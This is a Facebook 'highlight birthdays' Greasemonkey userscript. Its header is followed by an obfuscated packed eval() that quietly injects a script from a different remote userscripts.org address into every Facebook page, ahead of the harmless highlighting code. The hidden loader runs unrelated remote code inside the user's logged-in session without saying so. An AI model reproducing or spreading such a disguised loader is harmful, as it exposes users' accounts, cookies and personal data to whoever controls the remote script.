// ==UserScript==
// @name          Facebook Highlight Birthdays Plus + Last Update
// @version       14
// @date          2010-07-22
// @description   Highlights today's birthdays on your home page.
// @namespace     http://www.theworldofstuff.com/greasemonkey/
// @copyright     Copyright 2007-2010 Jordon Kalilich (http://www.theworldofstuff.com/)
// @license       GNU GPL version 3 or later; http://www.gnu.org/copyleft/gpl.html
// @require       http://usocheckup.dune.net/12813.js?maxage=5
// @include       http://*.facebook.com/*
// @include       https://*.facebook.com/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @exclude       http://*.facebook.com/ajax/*
// @exclude       https://*.facebook.com/ajax/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


// option
var highlightColor = '#fffe88';

// the actual code
function findBdays(event) {
   var birthdays = document.evaluate("//div[@class='UIImageBlock clearfix']", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
   for (i = birthdays.snapshotLength - 1; i >= 0; i--) {
      if (birthdays.snapshotItem(i).innerHTML.indexOf('hpbday') >= 0) {
         birthdays.snapshotItem(i).setAttribute('style','background: ' + highlightColor);
         birthdays.snapshotItem(i).childNodes[1].setAttribute('style','font-weight: bold; background: ' + highlightColor);
         document.removeEventListener('DOMNodeInserted', findBdays, true); // we need to remove the event listener or we might cause an infinite loop apparently
         break;
      }
   }
}

if (top.location == location && /\.facebook\.com$/i.test(location.hostname)) {
   document.addEventListener('DOMNodeInserted', findBdays, true);
}
